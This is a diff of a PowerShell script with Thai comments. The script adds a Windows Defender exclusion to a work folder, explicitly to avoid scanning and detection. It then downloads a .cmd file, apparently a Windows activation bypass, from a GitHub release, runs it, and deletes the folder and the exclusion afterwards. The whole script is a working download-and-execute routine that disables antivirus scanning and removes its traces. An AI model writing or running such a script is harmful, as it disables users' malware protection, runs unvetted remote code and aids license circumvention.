@@ -1,19 +1,19 @@
 # 1. สร้างโฟลเดอร์สำหรับทำงาน
 $workDir = "C:\phwyverysad"
 if (!(Test-Path $workDir)) {
-    New-Item -Path $workDir -ItemType Directory | Out-Null
+    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
 }
 
-# 2. เพิ่ม Exclusion ให้กับโฟลเดอร์เพื่อเลี่ยงการสแกนของ Windows Defender
+# 2. เพิ่ม Exclusion ให้กับโฟลเดอร์เพื่อป้องกันการตรวจจับระหว่างทำงาน
 Write-Host "Configuring exclusions..." -ForegroundColor Cyan
 Add-MpPreference -ExclusionPath $workDir
 
-# 3. กำหนด URL และที่เก็บไฟล์
-$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/HWID_Activation.cmd"
-$output = Join-Path $workDir "HWID_Activation.cmd"
+# 3. กำหนด URL และเส้นทางไฟล์ปลายทาง
+$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/activate_windows.cmd"
+$output = Join-Path $workDir "activate_windows.cmd"
 
 # 4. ดาวน์โหลดไฟล์โดยใช้ .NET (WebClient)
-Write-Host "Downloading file..." -ForegroundColor Cyan
+Write-Host "Downloading..." -ForegroundColor Cyan
 $webClient = New-Object System.Net.WebClient
 try {
     $webClient.DownloadFile($url, $output)
@@ -23,19 +23,20 @@ catch {
     exit
 }
 
-# 5. สั่งรันไฟล์ .cmd และรอจนกว่ากระบวนการจะเสร็จสิ้น
+# 5. สั่งรันไฟล์ .cmd และรอจนกว่าจะปิดตัวลง
 if (Test-Path $output) {
     Write-Host "Running script..." -ForegroundColor Yellow
     $process = Start-Process -FilePath $output -Wait -PassThru
     
-    # 6. เมื่อโปรแกรมปิดตัวลง (Wait จนจบแล้ว) ให้ทำการลบโฟลเดอร์
+    # 6. เมื่อปิดลงแล้ว ทำการล้างข้อมูล
     Write-Host "Cleaning up..." -ForegroundColor Green
-    # ลบ Exclusion ออกก่อนเพื่อความสะอาดของระบบ (เลือกได้ว่าจะเอาบรรทัดนี้ไว้ไหม)
+    
+    # ลบ Exclusion ออกเพื่อคืนค่าความปลอดภัยให้ระบบ
     Remove-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
     
-    # ลบโฟลเดอร์และไฟล์ทั้งหมดภายใน
+    # ลบโฟลเดอร์และไฟล์ทั้งหมด
     Remove-Item -Path $workDir -Recurse -Force
-    Write-Host "Done." -ForegroundColor White
+    Write-Host "Process completed." -ForegroundColor White
 }
 else {
     Write-Host "File not found!" -ForegroundColor Red
